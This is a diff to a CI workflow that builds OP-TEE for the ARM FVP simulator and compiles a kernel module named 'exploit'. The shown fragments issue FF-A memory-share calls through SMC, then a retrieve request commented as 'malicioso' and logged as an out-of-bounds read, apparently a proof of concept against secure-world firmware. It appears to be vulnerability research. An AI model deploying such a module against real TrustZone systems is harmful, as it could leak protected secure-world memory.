@@ -1,4 +1,4 @@
-name: Build OP-TEE FVP + Exploit
+name: Build OP-TEE FVP + Exploit LKM
 
 on:
   push:
@@ -12,11 +12,7 @@ jobs:
     steps:
       - name: Free up disk space
         run: |
-          sudo rm -rf /usr/share/dotnet
-          sudo rm -rf /opt/ghc
-          sudo rm -rf "/usr/local/share/boost"
-          sudo rm -rf "$AGENT_TOOLSDIRECTORY"
-          sudo rm -rf /usr/local/lib/android
+          sudo rm -rf /usr/share/dotnet /opt/ghc "/usr/local/share/boost" "$AGENT_TOOLSDIRECTORY" /usr/local/lib/android
           sudo apt-get clean
           df -h
 
@@ -107,7 +103,6 @@ static int __init exploit_init(void) {
     arm_smccc_smc(FFA_RXTX_MAP_SMC64, virt_to_phys(tx_buf), virt_to_phys(rx_buf), 1, 0, 0, 0, 0, &res);
     pr_info("[oob_read] RXTX_MAP: res.a0=0x%lx\n", res.a0);
 
-    // FFA_MEM_SHARE
     memset(tx_buf, 0, 4096);
     trans = (struct ffa_mem_transaction *)tx_buf;
     trans->sender_id = 0x1;
@@ -141,7 +136,6 @@ static int __init exploit_init(void) {
 
     uint64_t handle = ((uint64_t)res.a2 << 32) | res.a1;
 
-    // FFA_MEM_RETRIEVE_REQ malicioso
     memset(tx_buf, 0, 4096);
     trans = (struct ffa_mem_transaction *)tx_buf;
     trans->sender_id = 0x1;
@@ -181,12 +175,10 @@ module_exit(exploit_exit);
 MODULE_LICENSE("GPL");
 INNER_EOF
 
-          cat > optee-lkm/Makefile << 'INNER_EOF'
-obj-m += exploit.o
-KDIR ?= $(CURDIR)/../optee-fvp/linux
-all:
-    make -C $(KDIR) M=$(CURDIR) modules ARCH=arm64 CROSS_COMPILE=$(CURDIR)/../optee-fvp/toolchains/aarch64/bin/aarch64-linux-gnu-
-INNER_EOF
+          printf 'obj-m += exploit.o\n' > optee-lkm/Makefile
+          printf 'KDIR ?= $(CURDIR)/../optee-fvp/linux\n' >> optee-lkm/Makefile
+          printf 'all:\n' >> optee-lkm/Makefile
+          printf '\t$(MAKE) -C $(KDIR) M=$(CURDIR) modules ARCH=arm64 CROSS_COMPILE=$(CURDIR)/../optee-fvp/toolchains/aarch64/bin/aarch64-linux-gnu-\n' >> optee-lkm/Makefile
 
       - name: Compile Exploit LKM
         run: |
@@ -206,4 +198,5 @@ INNER_EOF
             optee-fvp/trusted-firmware-a/build/fvp/release/bl1.bin
             optee-fvp/trusted-firmware-a/build/fvp/release/fip.bin
             optee-fvp/out/boot-fat.uefi.img
+            optee-lkm/exploit.ko
           if-no-files-found: error
